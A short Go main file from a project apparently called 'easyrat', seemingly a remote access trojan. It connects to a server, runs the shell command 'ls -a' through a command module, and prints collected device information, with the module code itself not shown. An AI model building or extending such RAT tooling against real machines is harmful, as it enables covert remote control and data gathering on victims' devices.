package main

import (
	"easyrat/payload/modules"
	"easyrat/utils"
	"fmt"
	"strings"
)

func divider(title string) {
	lineLength := 30
	titleLength := len(title)
	paddingLength := (lineLength - titleLength - 2) / 2

	line := strings.Repeat("-", lineLength)
	padding := strings.Repeat(" ", paddingLength)

	fmt.Println(line)
	fmt.Printf("|%s%s%s|\n", padding, title, padding)
	fmt.Println(line)
}

func main() {
	// Connect to the server
	divider("Setup")
	if err := utils.ConnectServer(); err != nil {
		panic("Could not connect to the server! " + err.Error())
	}

	// Run hello function
	divider("Hello")
	modules.Hello()

	// Run a command
	divider("Command")
	if output, err := modules.Command("ls -a"); err != nil {
		fmt.Printf("Error running command. %s\n", err.Error())
	} else {
		fmt.Print(output)
	}

	// Get Device Information
	divider("Device Information")
	fmt.Printf("%+v\n", modules.DeviceInfo())
}
